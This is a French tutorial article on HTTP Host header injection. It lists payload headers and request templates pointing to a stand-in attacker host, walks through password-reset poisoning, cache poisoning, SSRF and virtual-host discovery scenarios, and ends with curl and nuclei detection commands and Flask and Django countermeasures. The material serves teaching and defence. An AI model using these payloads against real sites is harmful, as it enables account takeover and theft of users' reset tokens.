---
title: Host Header Injection
domain: sciences-appliquées
subdomain: informatique / sécurité / web
tags: [host-header, injection, web, password-reset, ssrf, sécurité]
date: 2026-03-22
---

# Host Header Injection

L'injection d'en-tête Host exploite le fait que certaines applications utilisent la valeur de l'en-tête HTTP `Host` pour construire des URLs (liens de réinitialisation de mot de passe, redirections, ressources absolues) sans la valider. Un attaquant peut substituer l'en-tête pour faire pointer ces URLs vers son infrastructure.

## Principe

```
Requête normale :
GET /reset-password?token=ABC123 HTTP/1.1
Host: site.com

→ Email envoyé : "Cliquez ici : https://site.com/reset?token=ABC123"

Requête empoisonnée :
GET /reset-password HTTP/1.1
Host: attaquant.com           ← Modifié

→ Email envoyé : "Cliquez ici : https://attaquant.com/reset?token=TOKEN_VICTIME"
→ La victime clique → son token de reset est envoyé à attaquant.com
→ Account Takeover
```

## Vecteurs d'injection

### En-tête Host direct

```
Host: attaquant.com
Host: site.com:attaquant.com      # Port comme domaine attaquant
Host: attaquant.com:80
```

### En-têtes alternatifs (parfois prioritaires)

```
X-Forwarded-Host: attaquant.com
X-Host: attaquant.com
X-Forwarded-Server: attaquant.com
X-HTTP-Host-Override: attaquant.com
Forwarded: host=attaquant.com
X-Original-Host: attaquant.com
```

### Ambiguïté de parsing

```
# Certains serveurs acceptent un port arbitraire (ignoré dans la génération d'URL)
Host: site.com:@attaquant.com    # Confusion credentials/host

# Double en-tête Host (comportement dépend du serveur)
Host: site.com
Host: attaquant.com
```

## Scénarios d'exploitation

### 1. Password Reset Poisoning

```
Scenario :
1. Attaquant initie une réinitialisation de mot de passe pour victim@site.com
2. Intercepte la requête avec Burp, modifie Host: attaquant.com
3. Un email est envoyé à la victime avec un lien vers attaquant.com
4. La victime clique → attaquant.com loggue le token
5. Attaquant utilise le token pour réinitialiser le mot de passe

Côté serveur vulnérable :
reset_url = f"https://{request.headers.get('Host')}/reset?token={token}"
send_email(user.email, reset_url)
```

### 2. Cache Poisoning via Host

```
# Combiné avec le cache web
GET / HTTP/1.1
Host: attaquant.com
Cache-Control: no-cache

# Si la réponse contient :
<script src="https://attaquant.com/jquery.js">

# Et si la réponse est mise en cache → XSS pour tous les visiteurs
```

### 3. SSRF via Host Routing

```
# Dans des architectures microservices, le Host détermine le routage
GET /admin HTTP/1.1
Host: internal-service.local     # Accéder à un service interne

# Si le load balancer route selon le Host → accès à des services non exposés
```

### 4. Virtual Host Discovery

```
# Tester différents sous-domaines sur la même IP
Host: admin.site.com
Host: internal.site.com
Host: dev.site.com
Host: staging.site.com
Host: vpn.site.com

# Certains virtual hosts répondent différemment ou exposent plus de fonctionnalités
```

## Détection

```bash
# Test basique avec curl
curl -H "Host: attaquant.com" https://site.com/forgot-password \
     -d "email=votre@email.com" -v

# Vérifier si l'email reçu contient "attaquant.com" dans les liens

# Avec X-Forwarded-Host
curl -H "X-Forwarded-Host: attaquant.com" https://site.com/ -I
# Observer la réponse : contient-elle attaquant.com ?

# Burp Suite — Repeater
# Modifier Host manuellement, observer la réponse et l'email reçu

# Scan avec nuclei
nuclei -u https://site.com -t http/host-header-injection.yaml
```

## Contre-mesures

```python
# Flask — utiliser SERVER_NAME ou une configuration explicite
# MAUVAIS
reset_url = f"https://{request.headers.get('Host')}/reset?token={token}"

# BIEN — URL absolue depuis la configuration (pas depuis les headers)
from flask import url_for, current_app

with current_app.test_request_context():
    reset_url = f"{current_app.config['BASE_URL']}/reset?token={token}"
# BASE_URL = "https://site.com" → valeur fixe dans la config

# Django — ALLOWED_HOSTS + configuration
ALLOWED_HOSTS = ['site.com', 'www.site.com']  # Valide et rejette les autres
USE_X_FORWARDED_HOST = False  # Ne pas faire confiance à X-Forwarded-Host

# Validation explicite du Host
TRUSTED_HOSTS = {'site.com', 'www.site.com'}

def validate_host(request):
    host = request.headers.get('Host', '').split(':')[0]  # ignorer le port
    if host not in TRUSTED_HOSTS:
        raise ValueError(f"Host non autorisé : {host}")
```
